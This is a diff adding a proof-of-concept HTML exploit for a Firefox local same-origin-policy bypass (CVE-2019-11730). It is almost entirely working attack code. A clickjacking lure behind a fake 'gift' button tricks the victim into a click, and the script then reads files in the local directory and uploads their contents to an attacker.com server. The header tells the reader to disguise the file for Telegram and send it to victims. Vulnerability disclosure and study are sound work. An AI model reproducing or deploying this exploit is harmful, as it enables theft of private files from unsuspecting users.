@@ -1,0 +1,173 @@
+<html>
+    <!--
+        This is a proof of concept for Mozilla Firefox local SOP bypass (CVE-2019-11730)
+
+        Steps to reprodure:
+        1- Change name of this file to something like ".0000000000000000000000000_poc.html" (above .nomedia for Telegram)
+        2- Edit CSS properties for Clickjacking attack.
+        3- Upload upload.php file to the web server and change value of server_url variable to its URL.
+        4- Open the file locally on a vulnerable version of Mozilla Firefox (<=67) (Or send the file to the victim).
+        5- Click "Click Me! I have a gift for you!" button.
+        6- Check the web server for the uploaded files.
+
+        Contact: https://memoryleaks.ir/author/alidini/
+    -->
+
+    <meta content="text/html;charset=utf-8" http-equiv="Content-Type">
+    <meta content="utf-8" http-equiv="encoding">
+
+    <body onload="is_vulnerable()">
+
+        <style>
+            /* hidden iframe to check SOP bypass */
+            .check_iframe{
+                width: 0;
+                height: 0;
+                visibility:hidden;
+            }
+
+             /*
+             NOTE: As Clickjacking is based on the location of items,
+             you should change below CSS properties (width, height, left, top) to fit other device screens.
+             */
+            /* invisible but clickable iframe, victim will click this iframe. */
+            .exploit_iframe{
+                opacity: 0.05;
+                width: 1000;
+                height: 1000;
+                position: absolute;
+                left: 0;
+                top: 0;
+            }
+
+            /* fake button in front of the invisble iframe for Clickjacking attack */
+            .fake_button{
+                z-index: -1;
+                height: 30;
+                position: absolute;
+                left: 144.5;
+                top: 215;
+            }
+
+        </style>
+
+        <script>
+
+
+            // Vulnerable versions: Mozilla Firefox <= 67,  68=< versions are not vulnerable.
+            function is_vulnerable(){
+                var user_agent = navigator.userAgent;
+                 // Web browser isn't Mozilla Firefox, return.
+                if(user_agent.indexOf("Firefox") == -1){
+                    console.log("- Error: Web browser isn't Mozilla firefox!");
+                    return;
+                }
+                console.log("+ Web browser is Mozilla Firefox.")
+                var version = navigator.userAgent.split("rv:")[1].split(".")[0];
+                // Not vulnerable version, return.
+                if(68 < version){
+                    console.log("- Error: Not vulnerable version!");
+                    return;
+                }
+                console.log("+ This version in vulnerable!");
+                // Not loaded locally, return.
+                if (location.protocol != "file:"){
+                    console.log("- Error: File isn't loaded locally!");
+                    return;
+                }
+                // File is loaded locally on a vulnerable version of Mozilla Firefox, It's time to pwn files!
+                console.log("+ File is loaded locally!");
+                check_sop_bypassed();
+            }
+
+
+            function check_sop_bypassed(){
+                // Create a hidden iframe pointing to the parent directory,Check can we access its contents or not.
+                var check_iframe = document.createElement("iframe");
+                check_iframe.src = "./";
+                check_iframe.className = "check_iframe";
+                check_iframe.onload = function(){
+                    
+                    if(check_iframe.contentDocument == null){
+                        // SOP is not bypassed, Call exploit() function to bypass SOP.
+                        console.log("- SOP is not bypassed");
+                        console.log("+ Tricking user to click the fake button.(Clickjacking attack)...");
+                        exploit();
+                    }else{
+                        // SOP is bypassed, We can access contents of the iframe's document (parent directory listing)
+                        console.log("+ SOP is bypassed!");
+                        console.log("+ Reading files to upload to the server...");
+                        analyze_directory_contents(check_iframe.contentDocument.body.innerText);                    
+                    }
+
+                };
+                document.body.append(check_iframe);
+            }
+
+
+            function exploit(){
+                // Use Clickjacking to trick the victim to click name of current file name in the hidden iframe.
+                // First, Create a hidden iframe pointing to the parent directory.
+                var exploit_iframe = document.createElement("iframe");
+                exploit_iframe.src = "./";
+                exploit_iframe.className = "exploit_iframe";
+                document.body.append(exploit_iframe);
+                // Second, Create a fake button and trick the user to click it.
+                var fake_button = document.createElement("button");
+                fake_button.className = "fake_button";
+                fake_button.innerText = "Click Me! I have a gift for you!";
+                document.body.append(fake_button);
+            }
+        
+
+            function analyze_directory_contents(parent_directory_contents){
+                /*
+                Contents of parent directoet page:
+                Index of file:///path/to/panret/directory[\n\n]
+                Up to higher level directory[\n\n]
+                Name Size Last Modified[\n\n]
+                filename1.txt[\n\t]3[ KB\t] 11/8/19 6:41:48 AM GMT+3:30[\n\n]
+                filename2.txt[\n\t]120[ KB\t] 6/6/19 11:44:19 PM GMT+4:30[\n\n]
+                filename3.txt[\n\t]3043[ KB\t] 6/3/19 7:02:32 PM GMT+4:30[\n\n]                
+                */
+                // Extract file names from the contents, call upload_file() function to read and upload them to the attacker.
+                lines = parent_directory_contents.split("\n\n");
+                lines.forEach(
+                    function(line){
+                        // Is file and not empty.
+                        if(line.indexOf(" KB\t") != -1){
+                            filename = line.split(" KB\t")[0].split("\n\t")[0].trim();
+                            upload_file(filename);
+                        }
+                    }
+                );
+
+            }
+
+
+            function upload_file(filename){
+                var server_url = "https://attacker.com/upload.php";
+                var file_reader = new XMLHttpRequest();
+                // First, read the file contents.
+                file_reader.open("GET",filename,true);
+                file_reader.onreadystatechange = function(){
+                    if (this.readyState == 4){
+                        filename = encodeURIComponent(filename);
+                        file_contents = encodeURIComponent(file_reader.responseText);
+                        // Second, upload the file.
+                        var uploader = new XMLHttpRequest();
+                        var post_data = "fname=" + filename + "&contents=" + file_contents;
+                        uploader.open("POST",server_url,true);
+                        uploader.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded; charset=UTF-8');
+                        uploader.send(post_data);
+                    }
+                };
+                file_reader.send();
+
+            }
+
+        </script>
+
+    </body>
+
+</html>
